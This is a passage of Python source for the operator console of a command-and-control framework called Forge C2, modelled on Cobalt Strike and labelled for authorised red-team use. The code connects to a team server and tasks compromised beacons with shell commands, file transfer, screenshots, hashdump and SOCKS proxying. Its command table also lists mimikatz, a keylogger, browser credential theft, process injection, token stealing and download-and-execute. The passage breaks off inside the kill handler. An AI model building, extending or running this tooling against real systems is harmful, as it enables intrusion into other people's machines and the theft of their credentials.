#!/usr/bin/env python3
"""
Forge C2 — Operator Shell
============================
Interactive operator console for the Forge C2 Team Server.

Connects via JSON-over-TCP (length-prefixed) to the team server's
operator API, provides tab completion, command history, beacon
interaction mode, and rich colored output.

Think Cobalt Strike's beacon console, but angrier and in Python.

FOR AUTHORIZED RED TEAM OPERATIONS ONLY.

Usage:
    python -m forge_c2.operator_shell --server 127.0.0.1 --port 50050

    # Or through forge.py:
    python forge.py c2 connect --server 127.0.0.1:50050
"""
from __future__ import annotations

import argparse
import asyncio
import getpass
import json
import logging
import os
import re
import shutil
import signal
import struct
import sys
import time
from dataclasses import dataclass
from enum import Enum
from pathlib import Path
from typing import Any

log = logging.getLogger("forge.c2.shell")


# ══════════════════════════════════════════════════════════════════════
#  ANSI COLORS — because staring at monochrome output is for animals
# ══════════════════════════════════════════════════════════════════════

class C:
    """ANSI color codes. Life's too short for plain text."""
    RESET       = "\033[0m"
    BOLD        = "\033[1m"
    DIM         = "\033[2m"
    ITALIC      = "\033[3m"
    UNDERLINE   = "\033[4m"

    # Foreground
    RED         = "\033[91m"
    GREEN       = "\033[92m"
    YELLOW      = "\033[93m"
    BLUE        = "\033[94m"
    MAGENTA     = "\033[95m"
    CYAN        = "\033[96m"
    WHITE       = "\033[97m"
    GRAY        = "\033[90m"

    # Semantic
    PROMPT      = "\033[38;5;46m"     # Neon green — operator prompt
    BEACON_ID   = "\033[38;5;214m"    # Orange — beacon IDs
    SUCCESS     = "\033[38;5;46m"     # Green
    ERROR       = "\033[38;5;196m"    # Red
    WARNING     = "\033[38;5;220m"    # Yellow
    INFO        = "\033[38;5;39m"     # Blue
    HEADER      = "\033[38;5;141m"    # Purple — table headers
    ACCENT      = "\033[38;5;51m"     # Cyan — highlights
    DEAD        = "\033[38;5;240m"    # Dim gray — dead beacons


def _supports_color() -> bool:
    """Check if terminal supports ANSI colors."""
    if os.environ.get("NO_COLOR"):
        return False
    if sys.platform == "win32":
        # Windows 10+ supports VT100 sequences
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
            return True
        except Exception:
            return os.environ.get("ANSICON") is not None
    return hasattr(sys.stdout, "isatty") and sys.stdout.isatty()


if not _supports_color():
    # Strip all color codes if terminal doesn't support them
    for attr in dir(C):
        if not attr.startswith("_"):
            setattr(C, attr, "")


# ══════════════════════════════════════════════════════════════════════
#  TRANSPORT — JSON-over-TCP to TeamServer
# ══════════════════════════════════════════════════════════════════════

class ServerTransport:
    """TCP client for the TeamServer operator API.

    Protocol (matching server.py):
        Send: [4-byte big-endian length][JSON payload]
        Recv: [4-byte big-endian length][JSON response]
    """

    def __init__(self, host: str = "127.0.0.1", port: int = 50050) -> None:
        self.host = host
        self.port = port
        self._reader: asyncio.StreamReader | None = None
        self._writer: asyncio.StreamWriter | None = None
        self._connected = False

    async def connect(self) -> bool:
        """Establish TCP connection to team server."""
        try:
            self._reader, self._writer = await asyncio.wait_for(
                asyncio.open_connection(self.host, self.port),
                timeout=10.0,
            )
            self._connected = True
            return True
        except (OSError, asyncio.TimeoutError) as exc:
            log.error("Connection failed: %s", exc)
            self._connected = False
            return False

    async def send(self, data: dict[str, Any]) -> dict[str, Any]:
        """Send a JSON command and receive the response.

        Args:
            data: Command dict (must include 'cmd' key).

        Returns:
            Response dict from server.

        Raises:
            ConnectionError if disconnected.
        """
        if not self._connected or not self._writer or not self._reader:
            raise ConnectionError("Not connected to team server")

        try:
            payload = json.dumps(data, default=str).encode()
            # Length-prefixed send
            self._writer.write(struct.pack(">I", len(payload)) + payload)
            await self._writer.drain()

            # Read response: [4-byte len][JSON]
            header = await asyncio.wait_for(self._reader.readexactly(4), timeout=30.0)
            resp_len = struct.unpack(">I", header)[0]
            if resp_len > 10 * 1024 * 1024:
                raise ValueError(f"Response too large: {resp_len} bytes")

            resp_data = await asyncio.wait_for(
                self._reader.readexactly(resp_len), timeout=30.0,
            )
            return json.loads(resp_data)

        except (asyncio.IncompleteReadError, asyncio.TimeoutError) as exc:
            self._connected = False
            raise ConnectionError(f"Server disconnected: {exc}") from exc

    async def disconnect(self) -> None:
        """Close the connection."""
        if self._writer:
            try:
                self._writer.close()
                await self._writer.wait_closed()
            except Exception:
                pass
        self._connected = False

    @property
    def connected(self) -> bool:
        return self._connected


# ══════════════════════════════════════════════════════════════════════
#  COMMAND REGISTRY — all operator commands
# ══════════════════════════════════════════════════════════════════════

@dataclass
class CommandInfo:
    """Metadata for a shell command."""
    name:        str
    aliases:     list[str]
    usage:       str
    description: str
    category:    str = "General"
    admin_only:  bool = False
    requires_beacon: bool = False


# All available commands and their metadata
COMMANDS: dict[str, CommandInfo] = {}

def _register(*aliases: str, usage: str = "", desc: str = "",
              category: str = "General", admin: bool = False,
              beacon: bool = False):
    """Decorator to register a command with metadata."""
    def decorator(func):
        name = aliases[0]
        info = CommandInfo(
            name=name,
            aliases=list(aliases),
            usage=usage,
            description=desc,
            category=category,
            admin_only=admin,
            requires_beacon=beacon,
        )
        for alias in aliases:
            COMMANDS[alias] = info
        func._cmd_info = info
        return func
    return decorator


# ══════════════════════════════════════════════════════════════════════
#  OPERATOR SHELL — the main event
# ══════════════════════════════════════════════════════════════════════

class OperatorShell:
    """Interactive C2 operator console.

    Features:
        - Tab completion for commands, beacon IDs, and listener IDs
        - Command history (up/down arrows)
        - Beacon interaction mode (interact <id>)
        - Rich colored table output
        - Persistent history file
        - Full RBAC awareness
    """

    BANNER = f"""
{C.GREEN}    ███████╗ ██████╗ ██████╗  ██████╗ ███████╗     ██████╗██████╗ {C.RESET}
{C.GREEN}    ██╔════╝██╔═══██╗██╔══██╗██╔════╝ ██╔════╝    ██╔════╝╚════██╗{C.RESET}
{C.GREEN}    █████╗  ██║   ██║██████╔╝██║  ███╗█████╗      ██║      █████╔╝{C.RESET}
{C.GREEN}    ██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝      ██║     ██╔═══╝ {C.RESET}
{C.GREEN}    ██║     ╚██████╔╝██║  ██║╚██████╔╝███████╗    ╚██████╗███████╗{C.RESET}
{C.GREEN}    ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝     ╚═════╝╚══════╝{C.RESET}
{C.DIM}    ─────────────────────────────────────────────────────────────{C.RESET}
{C.CYAN}    Forge C2 Operator Console{C.RESET}  │  {C.YELLOW}v5 APEX{C.RESET}
{C.DIM}    Type 'help' for commands. Tab-complete everything.{C.RESET}
"""

    def __init__(
        self,
        host: str = "127.0.0.1",
        port: int = 50050,
    ) -> None:
        self.transport = ServerTransport(host, port)
        self.host = host
        self.port = port

        # Session state
        self._authenticated = False
        self._username = ""
        self._role = ""
        self._session_token = ""

        # Beacon interaction mode
        self._active_beacon: str | None = None
        self._active_beacon_hostname: str = ""

        # Command history
        self._history: list[str] = []
        self._history_file = Path.home() / ".forge_c2_history"

        # Cache for tab completion
        self._beacon_ids: list[str] = []
        self._listener_ids: list[str] = []

        # State
        self._running = False

    # ── Entry point ────────────────────────────────────────────────

    async def run(self) -> None:
        """Main shell loop. Connect, authenticate, then process commands."""
        self._running = True

        # Connect
        self._print_info(f"Connecting to team server at {self.host}:{self.port}...")
        if not await self.transport.connect():
            self._print_error(f"Could not connect to {self.host}:{self.port}")
            return

        self._print_success("Connected!")

        # Authenticate
        if not await self._authenticate():
            await self.transport.disconnect()
            return

        # Show banner
        print(self.BANNER)
        self._print_info(
            f"Logged in as {C.BOLD}{self._username}{C.RESET}{C.INFO} "
            f"(role: {self._role})"
        )

        # Load history
        self._load_history()

        # Refresh caches
        await self._refresh_beacon_cache()
        await self._refresh_listener_cache()

        # Main REPL
        try:
            await self._command_loop()
        except KeyboardInterrupt:
            print()
            self._print_info("Caught Ctrl+C — disconnecting.")
        finally:
            self._save_history()
            await self.transport.disconnect()
            self._print_info("Disconnected.")

    async def _authenticate(self) -> bool:
        """Interactive authentication against the team server."""
        max_attempts = 3
        for attempt in range(1, max_attempts + 1):
            try:
                username = input(f"{C.CYAN}Username:{C.RESET} ").strip()
                if not username:
                    continue
                password = getpass.getpass(f"{C.CYAN}Password:{C.RESET} ")
            except (EOFError, KeyboardInterrupt):
                print()
                return False

            try:
                resp = await self.transport.send({
                    "cmd": "auth",
                    "username": username,
                    "password": password,
                })
            except ConnectionError as exc:
                self._print_error(f"Connection lost: {exc}")
                return False

            if resp.get("status") == "ok":
                self._authenticated = True
                self._username = resp.get("username", username)
                self._role = resp.get("role", "operator")
                self._session_token = resp.get("token", "")
                self._print_success(
                    f"Authenticated as {C.BOLD}{self._username}{C.RESET}"
                    f"{C.SUCCESS} ({self._role})"
                )
                return True
            else:
                remaining = max_attempts - attempt
                self._print_error(
                    f"Authentication failed. {remaining} attempt(s) remaining."
                )

        self._print_error("Max authentication attempts exceeded.")
        return False

    async def _command_loop(self) -> None:
        """Read-eval-print loop with history and completion."""
        while self._running:
            try:
                prompt = self._build_prompt()
                line = input(prompt).strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break

            if not line:
                continue

            # Add to history
            if not self._history or self._history[-1] != line:
                self._history.append(line)

            # Parse and dispatch
            parts = self._parse_command(line)
            if not parts:
                continue

            cmd = parts[0].lower()
            args = parts[1:]

            # Check for built-in commands first
            handler = self._get_handler(cmd)
            if handler:
                try:
                    await handler(args)
                except ConnectionError as exc:
                    self._print_error(f"Connection lost: {exc}")
                    self._print_info("Attempting reconnect...")
                    if await self.transport.connect():
                        self._print_success("Reconnected!")
                        # Re-auth with saved creds is not possible (no stored pw)
                        # User must re-auth
                        self._authenticated = False
                        self._print_warning("Please re-authenticate.")
                        if not await self._authenticate():
                            break
                    else:
                        self._print_error("Reconnect failed. Exiting.")
                        break
                except Exception as exc:
                    self._print_error(f"Command error: {exc}")
            else:
                # If in beacon context, treat unknown commands as shell commands
                if self._active_beacon:
                    await self._cmd_shell([line])
                else:
                    self._print_error(
                        f"Unknown command: '{cmd}'. Type 'help' for commands."
                    )

    # ── Prompt building ────────────────────────────────────────────

    def _build_prompt(self) -> str:
        """Build the shell prompt string."""
        if self._active_beacon:
            # Beacon interaction mode
            return (
                f"{C.DIM}[{C.RESET}"
                f"{C.BEACON_ID}{self._active_beacon}{C.RESET}"
                f"{C.DIM}/{C.RESET}"
                f"{C.CYAN}{self._active_beacon_hostname}{C.RESET}"
                f"{C.DIM}]{C.RESET}"
                f"{C.PROMPT}>{C.RESET} "
            )
        else:
            # Global mode
            return f"{C.PROMPT}forge-c2{C.RESET}{C.DIM}>{C.RESET} "

    # ── Command parsing ────────────────────────────────────────────

    @staticmethod
    def _parse_command(line: str) -> list[str]:
        """Parse a command line, respecting quoted strings."""
        tokens: list[str] = []
        current = ""
        in_quotes = False
        quote_char = ""
        for ch in line:
            if in_quotes:
                if ch == quote_char:
                    in_quotes = False
                else:
                    current += ch
            elif ch in ('"', "'"):
                in_quotes = True
                quote_char = ch
            elif ch == " ":
                if current:
                    tokens.append(current)
                    current = ""
            else:
                current += ch
        if current:
            tokens.append(current)
        return tokens

    def _get_handler(self, cmd: str):
        """Look up the handler method for a command."""
        cmd_map = {
            "help":             self._cmd_help,
            "?":                self._cmd_help,
            "beacons":          self._cmd_beacons,
            "beacon":           self._cmd_beacons,
            "interact":         self._cmd_interact,
            "use":              self._cmd_interact,
            "back":             self._cmd_back,
            "bg":               self._cmd_back,
            "shell":            self._cmd_shell,
            "exec":             self._cmd_shell,
            "run":              self._cmd_shell,
            "bof":              self._cmd_bof,
            "bofs":             self._cmd_bofs,
            "profiles":         self._cmd_profiles,
            "download":         self._cmd_download,
            "upload":           self._cmd_upload,
            "screenshot":       self._cmd_screenshot,
            "hashdump":         self._cmd_hashdump,
            "socks":            self._cmd_socks,
            "link":             self._cmd_link,
            "unlink":           self._cmd_unlink,
            "p2p_tree":         self._cmd_p2p_tree,
            "relay_tree":       self._cmd_p2p_tree,
            "sleep":            self._cmd_sleep,
            "kill":             self._cmd_kill,
            "info":             self._cmd_info,
            "note":             self._cmd_note,
            "listeners":        self._cmd_listeners,
            "listener":         self._cmd_listeners,
            "listener_create":  self._cmd_listener_create,
            "listener_start":   self._cmd_listener_start,
            "listener_stop":    self._cmd_listener_stop,
            "operators":        self._cmd_operators,
            "who":              self._cmd_operators,
            "status":           self._cmd_status,
            "server":           self._cmd_status,
            "history":          self._cmd_task_history,
            "task_history":     self._cmd_task_history,
            "tasks":            self._cmd_task_history,
            "task_all":         self._cmd_task_all,
            "taskall":          self._cmd_task_all,
            "add_operator":     self._cmd_add_operator,
            "addop":            self._cmd_add_operator,
            # ── Sprint 3: C2 Task Expansion ────────────────────
            "execute_assembly": self._cmd_execute_assembly,
            "execute-assembly": self._cmd_execute_assembly,
            "assembly":         self._cmd_execute_assembly,
            "keylogger":        self._cmd_keylogger,
            "keylog":           self._cmd_keylogger,
            "browser_creds":    self._cmd_browser_creds,
            "browsercreds":     self._cmd_browser_creds,
            "creds":            self._cmd_browser_creds,
            "clipboard":        self._cmd_clipboard,
            "clip":             self._cmd_clipboard,
            "mimikatz":         self._cmd_mimikatz,
            "mimi":             self._cmd_mimikatz,
            "logonpasswords":   self._cmd_mimikatz,
            "registry":         self._cmd_registry,
            "reg":              self._cmd_registry,
            "service":          self._cmd_service,
            "sc":               self._cmd_service,
            "wmi":              self._cmd_wmi,
            "inject":           self._cmd_inject,
            "shinject":         self._cmd_inject,
            "token":            self._cmd_token,
            "steal_token":      self._cmd_token,
            "rev2self":         self._cmd_rev2self,
            "make_token":       self._cmd_make_token,
            "portscan":         self._cmd_portscan,
            "scan":             self._cmd_portscan,
            "download_exec":    self._cmd_download_exec,
            "dlexec":           self._cmd_download_exec,
            "clear":            self._cmd_clear,
            "cls":              self._cmd_clear,
            "exit":             self._cmd_exit,
            "quit":             self._cmd_exit,
            "q":                self._cmd_exit,
        }
        return cmd_map.get(cmd)

    # ══════════════════════════════════════════════════════════════
    #  COMMAND IMPLEMENTATIONS
    # ══════════════════════════════════════════════════════════════

    async def _cmd_help(self, args: list[str]) -> None:
        """Display help — all commands grouped by category."""
        width = shutil.get_terminal_size().columns

        categories = {
            "Navigation": [
                ("help, ?",               "Show this help"),
                ("clear, cls",            "Clear terminal"),
                ("exit, quit, q",         "Disconnect and exit"),
            ],
            "Beacons": [
                ("beacons",               "List all beacons"),
                ("interact <id>",         "Enter beacon interaction mode"),
                ("back, bg",              "Return to global context"),
                ("info [id]",             "Detailed beacon info"),
                ("kill <id>",             "Kill a beacon"),
                ("sleep <id> <sec> [jit]","Set beacon sleep interval"),
                ("note <id> <text>",      "Add note to beacon (local)"),
            ],
            "Beacon Tasks (requires interact)": [
                ("shell <cmd>",           "Execute shell command on target"),
                ("bof <name|path> [args]","Run BOF (whoami/ps/netstat/ls/...)"),
                ("bofs",                  "List all available BOFs"),
                ("download <path>",       "Download file from target"),
                ("upload <local> <remote>","Upload file to target"),
                ("screenshot",            "Capture target screenshot"),
                ("hashdump",              "Dump password hashes"),
                ("socks <port>",          "Start SOCKS proxy through beacon"),
            ],
            "P2P Emulation": [
                ("link <parent> <child> [tcp|smb_named_pipe]", "Record emulated relay link"),
                ("unlink <child>",        "Remove emulated relay link"),
                ("p2p_tree",              "Show emulated relay tree"),
            ],
            "Listeners (admin)": [
                ("listeners",             "List all listeners"),
                ("listener_create",       "Create a new listener (interactive)"),
                ("listener_start <id>",   "Start a listener"),
                ("listener_stop <id>",    "Stop a listener"),
                ("profiles",              "List available malleable C2 profiles"),
            ],
            "Server": [
                ("status, server",        "Show team server status"),
                ("operators, who",        "List connected operators"),
                ("history, tasks",        "Show recent task history"),
                ("task_all <cmd> [args]",  "Send command to ALL beacons"),
                ("add_operator (admin)",  "Add a new operator"),
            ],
        }

        print()
        print(f"  {C.BOLD}{C.ACCENT}═══ Forge C2 Command Reference ═══{C.RESET}")
        print()

        for category, cmds in categories.items():
            print(f"  {C.HEADER}{C.BOLD}{category}{C.RESET}")
            print(f"  {C.DIM}{'─' * min(50, width - 4)}{C.RESET}")
            for name, desc in cmds:
                print(f"    {C.GREEN}{name:<28}{C.RESET} {C.DIM}{desc}{C.RESET}")
            print()

        if self._active_beacon:
            print(
                f"  {C.INFO}💡 You're interacting with beacon "
                f"{C.BEACON_ID}{self._active_beacon}{C.RESET}"
                f"{C.INFO}. Unknown commands are sent as 'shell' tasks.{C.RESET}"
            )
            print()

    async def _cmd_beacons(self, args: list[str]) -> None:
        """List all registered beacons."""
        resp = await self.transport.send({"cmd": "beacons"})
        if resp.get("status") != "ok":
            self._print_error(resp.get("message", "Failed to list beacons"))
            return

        data = resp.get("data", {})
        beacons = data.get("beacons", [])

        if not beacons:
            self._print_warning("No beacons registered.")
            return

        # Refresh cache
        self._beacon_ids = [b["beacon_id"] for b in beacons]

        # Print table
        print()
        headers = ["ID", "HOSTNAME", "USER", "IP", "OS", "LAST", "SLEEP", "STATE"]
        col_w =   [10,    18,          14,     16,   12,   10,     12,      10]

        # Header row
        header_line = ""
        for h, w in zip(headers, col_w):
            header_line += f"{C.HEADER}{C.BOLD}{h:<{w}}{C.RESET}"
        print(f"  {header_line}")
        print(f"  {C.DIM}{'─' * sum(col_w)}{C.RESET}")

        for b in beacons:
            state = b.get("state", "unknown")
            meta = b.get("metadata", {})
            bid = b["beacon_id"]
            hostname = meta.get("hostname", "???")[:16]
            user = meta.get("username", "???")[:12]
            ip = meta.get("internal_ip", "") or meta.get("external_ip", "")
            ip = ip[:14] if ip else "???"
            os_ver = meta.get("os_version", "")[:10] or meta.get("os_type", "")[:10]

            # Time since check-in
            tsc = b.get("time_since_checkin", 0)
            if tsc < 60:
                last = f"{int(tsc)}s ago"
            elif tsc < 3600:
                last = f"{int(tsc / 60)}m ago"
            else:
                last = f"{int(tsc / 3600)}h ago"

            # Sleep
            sleep_s = b.get("sleep_seconds", 60)
            jitter = b.get("jitter_pct", 0)
            sleep_str = f"{int(sleep_s)}s/{int(jitter)}%"

            # Color-code state
            if state == "active":
                state_color = C.GREEN
                state_icon = "●"
            elif state == "sleeping":
                state_color = C.BLUE
                state_icon = "◐"
            elif state == "staging":
                state_color = C.YELLOW
                state_icon = "○"
            elif state == "dead":
                state_color = C.DEAD
                state_icon = "✖"
            elif state == "killed":
                state_color = C.RED
                state_icon = "✖"
            else:
                state_color = C.DIM
                state_icon = "?"

            # Highlight active beacon
            id_color = C.BEACON_ID if bid == self._active_beacon else C.WHITE

            row = (
                f"  {id_color}{bid:<10}{C.RESET}"
                f"{hostname:<18}"
                f"{user:<14}"
                f"{ip:<16}"
                f"{os_ver:<12}"
                f"{last:<10}"
                f"{sleep_str:<12}"
                f"{state_color}{state_icon} {state:<8}{C.RESET}"
            )
            print(row)

        # Summary
        states = data.get("states", {})
        active = states.get("active", 0)
        total = data.get("total", len(beacons))
        print()
        print(
            f"  {C.DIM}Total: {total} │ "
            f"{C.GREEN}Active: {active}{C.DIM} │ "
            f"Dead: {states.get('dead', 0)} │ "
            f"Killed: {states.get('killed', 0)}{C.RESET}"
        )
        print()

    async def _cmd_interact(self, args: list[str]) -> None:
        """Enter beacon interaction mode."""
        if not args:
            self._print_error("Usage: interact <beacon_id>")
            return

        bid = args[0]

        # Try partial match
        matched = self._match_beacon_id(bid)
        if not matched:
            self._print_error(f"Beacon '{bid}' not found. Run 'beacons' to list.")
            return

        # Get beacon info for the hostname
        resp = await self.transport.send({
            "cmd": "beacon_info", "beacon_id": matched,
        })
        if resp.get("status") != "ok":
            self._print_error(resp.get("message", "Beacon not found"))
            return

        data = resp.get("data", {})
        meta = data.get("metadata", {})

        self._active_beacon = matched
        self._active_beacon_hostname = meta.get("hostname", "???")

        self._print_success(
            f"Interacting with beacon {C.BEACON_ID}{matched}{C.RESET}"
            f"{C.SUCCESS} ({self._active_beacon_hostname})"
        )
        state = data.get("state", "")
        if state != "active":
            self._print_warning(
                f"⚠ Beacon state is '{state}' — tasks may not be delivered."
            )

    async def _cmd_back(self, args: list[str]) -> None:
        """Return to global context."""
        if self._active_beacon:
            self._print_info(
                f"Left beacon {C.BEACON_ID}{self._active_beacon}{C.RESET}"
            )
        self._active_beacon = None
        self._active_beacon_hostname = ""

    async def _cmd_shell(self, args: list[str]) -> None:
        """Execute shell command on target beacon."""
        bid = self._require_beacon()
        if not bid:
            return
        if not args:
            self._print_error("Usage: shell <command>")
            return

        cmd_str = " ".join(args)
        resp = await self.transport.send({
            "cmd": "task",
            "beacon_id": bid,
            "task_cmd": "shell",
            "args": {"cmd": cmd_str},
        })
        self._print_task_result(resp, f"shell: {cmd_str}")

    async def _cmd_bof(self, args: list[str]) -> None:
        """Execute a BOF (Beacon Object File).

        Usage:
            bof whoami              — run built-in whoami BOF
            bof ls /tmp             — run built-in ls with args
            bof /path/to/custom.o   — run custom COFF BOF
        """
        if not args:
            self._print_error("Usage: bof <name|path.o> [args...]")
            self._print_info("Run 'bofs' to list available built-in BOFs.")
            return

        bof_name = args[0]
        bof_args = args[1:]

        # If we have an active beacon, send as a task
        if self._active_beacon:
            resp = await self.transport.send({
                "cmd": "task",
                "beacon_id": self._active_beacon,
                "task_cmd": "bof",
                "args": {"bof_name": bof_name, "args": bof_args},
            })
            self._print_task_result(resp, f"bof: {bof_name}")
        else:
            # No beacon — run locally (useful for testing)
            self._print_info(f"No active beacon — running BOF locally: {bof_name}")
            try:
                from forge_c2.bof.builtins import run_builtin_bof, BUILTIN_BOFS
                if bof_name in BUILTIN_BOFS:
                    exit_code, output = run_builtin_bof(bof_name, bof_args)
                    if exit_code == 0:
                        print(output)
                    else:
                        self._print_error(f"BOF exited with code {exit_code}")
                        print(output)
                else:
                    # Try as COFF file
                    from forge_c2.bof.bof_loader import BOFLoader
                    from forge_c2.bof.bof_api import BeaconAPI, BeaconDataPacker
                    from pathlib import Path

                    if Path(bof_name).exists():
                        api = BeaconAPI()
                        result = BOFLoader.from_file(bof_name, beacon_api=api)
                        if result.success:
                            self._print_success(f"BOF executed in {result.execution_time:.3f}s")
                            if result.output:
                                print(result.output)
                        else:
                            self._print_error(f"BOF failed: {result.error}")
                    else:
                        available = ", ".join(BUILTIN_BOFS.keys())
                        self._print_error(
                            f"Unknown BOF: {bof_name}\n"
                            f"  Available built-ins: {available}\n"
                            f"  Or provide path to a .o COFF file."
                        )
            except Exception as e:
                self._print_error(f"BOF error: {e}")

    async def _cmd_bofs(self, args: list[str]) -> None:
        """List all available BOFs (built-in and custom)."""
        from forge_c2.bof.builtins import list_builtin_bofs

        bofs = list_builtin_bofs()

        print()
        print(f"  {C.BOLD}{C.ACCENT}═══ Available BOFs ═══{C.RESET}")
        print()
        print(f"  {C.HEADER}{C.BOLD}{'NAME':<14} {'DESCRIPTION'}{C.RESET}")
        print(f"  {C.DIM}{'─' * 60}{C.RESET}")

        for bof in bofs:
            print(f"  {C.GREEN}{bof['name']:<14}{C.RESET} {C.DIM}{bof['description']}{C.RESET}")

        print()
        print(f"  {C.INFO}Usage: bof <name> [args]  |  bof <path.o> [args]{C.RESET}")
        print()

    async def _cmd_profiles(self, args: list[str]) -> None:
        """List available malleable C2 profiles."""
        from forge_c2.profiles.profile_parser import list_profiles, get_builtin_profile

        profiles = list_profiles()

        print()
        print(f"  {C.BOLD}{C.ACCENT}═══ Malleable C2 Profiles ═══{C.RESET}")
        print()
        print(f"  {C.HEADER}{C.BOLD}{'NAME':<16} {'SOURCE':<12} {'DESCRIPTION'}{C.RESET}")
        print(f"  {C.DIM}{'─' * 70}{C.RESET}")

        for p in profiles:
            name_color = C.GREEN if p["source"] == "built-in" else C.CYAN
            desc = p["description"][:50] + "..." if len(p["description"]) > 50 else p["description"]
            print(
                f"  {name_color}{p['name']:<16}{C.RESET}"
                f"{C.DIM}{p['source']:<12}{C.RESET}"
                f"{desc}"
            )

        print()

        # Show detail if a profile name is given
        if args:
            try:
                profile = get_builtin_profile(args[0])
                print(f"  {C.BOLD}Profile: {profile.name}{C.RESET}")
                print(f"  {C.DIM}Description: {profile.description}{C.RESET}")
                print(f"  HTTP GET URIs: {', '.join(profile.http_get.uri)}")
                print(f"  HTTP POST URIs: {', '.join(profile.http_post.uri)}")
                print(f"  Sleep: {profile.beacon.sleep}s  Jitter: {profile.beacon.jitter}%")
                print(f"  User-Agents: {len(profile.beacon.user_agents)}")
                if profile.ssl.cert_cn:
                    print(f"  SSL CN: {profile.ssl.cert_cn} ({profile.ssl.cert_org})")
                print()
            except ValueError as e:
                self._print_error(str(e))

        print(f"  {C.INFO}Usage: listener_create → select profile{C.RESET}")
        print(f"  {C.INFO}CLI: forge.py c2 start --profile <name>{C.RESET}")
        print()

    async def _cmd_download(self, args: list[str]) -> None:
        """Download file from target."""
        bid = self._require_beacon()
        if not bid:
            return
        if not args:
            self._print_error("Usage: download <remote_path>")
            return

        resp = await self.transport.send({
            "cmd": "task",
            "beacon_id": bid,
            "task_cmd": "download",
            "args": {"path": args[0]},
        })
        self._print_task_result(resp, f"download: {args[0]}")

    async def _cmd_upload(self, args: list[str]) -> None:
        """Upload file to target."""
        bid = self._require_beacon()
        if not bid:
            return
        if len(args) < 2:
            self._print_error("Usage: upload <local_path> <remote_path>")
            return

        local_path = args[0]
        remote_path = args[1]

        if not os.path.exists(local_path):
            self._print_error(f"Local file not found: {local_path}")
            return

        resp = await self.transport.send({
            "cmd": "task",
            "beacon_id": bid,
            "task_cmd": "upload",
            "args": {"local": local_path, "remote": remote_path},
        })
        self._print_task_result(resp, f"upload: {local_path} → {remote_path}")

    async def _cmd_screenshot(self, args: list[str]) -> None:
        """Capture target screenshot."""
        bid = self._require_beacon()
        if not bid:
            return

        resp = await self.transport.send({
            "cmd": "task",
            "beacon_id": bid,
            "task_cmd": "screenshot",
            "args": {},
        })
        self._print_task_result(resp, "screenshot")

    async def _cmd_hashdump(self, args: list[str]) -> None:
        """Dump password hashes."""
        bid = self._require_beacon()
        if not bid:
            return

        resp = await self.transport.send({
            "cmd": "task",
            "beacon_id": bid,
            "task_cmd": "hashdump",
            "args": {},
        })
        self._print_task_result(resp, "hashdump")

    async def _cmd_socks(self, args: list[str]) -> None:
        """Start SOCKS proxy through beacon."""
        bid = self._require_beacon()
        if not bid:
            return

        port = int(args[0]) if args else 1080
        resp = await self.transport.send({
            "cmd": "task",
            "beacon_id": bid,
            "task_cmd": "socks",
            "args": {"port": port},
        })
        self._print_task_result(resp, f"socks :{port}")

    async def _cmd_link(self, args: list[str]) -> None:
        """Record an emulated P2P relay link."""
        if len(args) < 2:
            self._print_error("Usage: link <parent_beacon> <child_beacon> [tcp|smb_named_pipe]")
            return
        parent = self._match_beacon_id(args[0]) or args[0]
        child = self._match_beacon_id(args[1]) or args[1]
        transport = args[2] if len(args) > 2 else "tcp"
        resp = await self.transport.send({
            "cmd": "p2p_link",
            "parent": parent,
            "child": child,
            "transport": transport,
        })
        if resp.get("status") != "ok":
            self._print_error(resp.get("message", "P2P link emulation failed"))
            return
        data = resp.get("data", {})
        self._print_success(
            f"Emulated relay link recorded: {data.get('parent')} -> "
            f"{data.get('child')} ({data.get('transport')})"
        )
        self._print_info("No peer listener, named pipe, or relay socket was started.")

    async def _cmd_unlink(self, args: list[str]) -> None:
        """Remove an emulated P2P relay link."""
        if not args:
            self._print_error("Usage: unlink <child_beacon>")
            return
        child = self._match_beacon_id(args[0]) or args[0]
        resp = await self.transport.send({"cmd": "p2p_unlink", "child": child})
        if resp.get("status") != "ok":
            self._print_error(resp.get("message", "P2P unlink emulation failed"))
            return
        data = resp.get("data", {})
        self._print_success(f"Emulated relay link removed for {data.get('child')}")

    async def _cmd_p2p_tree(self, args: list[str]) -> None:
        """Show emulated P2P relay topology."""
        resp = await self.transport.send({"cmd": "p2p_tree"})
        if resp.get("status") != "ok":
            self._print_error(resp.get("message", "Failed to load P2P tree"))
            return
        data = resp.get("data", {})
        nodes = data.get("nodes", [])
        print()
        print(f"  {C.BOLD}{C.ACCENT}=== Emulated P2P Relay Tree ==={C.RESET}")
        print()
        if not nodes:
            self._print_warning("No beacons registered.")
            return
        if not data.get("links"):
            self._print_info("No emulated relay links recorded.")
        for node in nodes:
            parent = node.get("parent") or "root"
            children = ", ".join(node.get("children", [])) or "-"
            print(
                f"  {C.BEACON_ID}{node.get('id', ''):<10}{C.RESET} "
                f"{node.get('hostname', ''):<18} "
                f"{C.DIM}parent={parent} children={children} "
                f"transport={node.get('transport', '')}{C.RESET}"
            )
        print()
        print(f"  {C.DIM}{data.get('safety', 'control-plane emulation only')}{C.RESET}")
        print()

    async def _cmd_sleep(self, args: list[str]) -> None:
        """Set beacon sleep interval."""
        # Can be used globally: sleep <bid> <sec> [jitter]
        # Or in beacon context: sleep <sec> [jitter]

        if self._active_beacon:
            if not args:
                self._print_error("Usage: sleep <seconds> [jitter%]")
                return
            bid = self._active_beacon
            seconds = float(args[0])
            jitter = float(args[1]) if len(args) > 1 else 20.0
        else:
            if len(args) < 2:
                self._print_error("Usage: sleep <beacon_id> <seconds> [jitter%]")
                return
            bid = self._match_beacon_id(args[0])
            if not bid:
                self._print_error(f"Beacon '{args[0]}' not found")
                return
            seconds = float(args[1])
            jitter = float(args[2]) if len(args) > 2 else 20.0

        resp = await self.transport.send({
            "cmd": "sleep",
            "beacon_id": bid,
            "seconds": seconds,
            "jitter": jitter,
        })
        if resp.get("status") == "ok":
            self._print_success(
                f"Beacon {C.BEACON_ID}{bid}{C.RESET}{C.SUCCESS} "
                f"sleep set to {seconds}s / {jitter}% jitter"
            )
        else:
            self._print_error(resp.get("message", "Sleep update failed"))

    async def _cmd_kill(self, args: list[str]) -> None:
        """Kill a beacon."""
        if self._active_beacon:
            bid = self._active_beacon
        elif args:
            bid = self._match_beacon_id(args[0])
            if not bid:
                self._print_error(f"Beacon '{args[0]}' not found")
                return
        else:
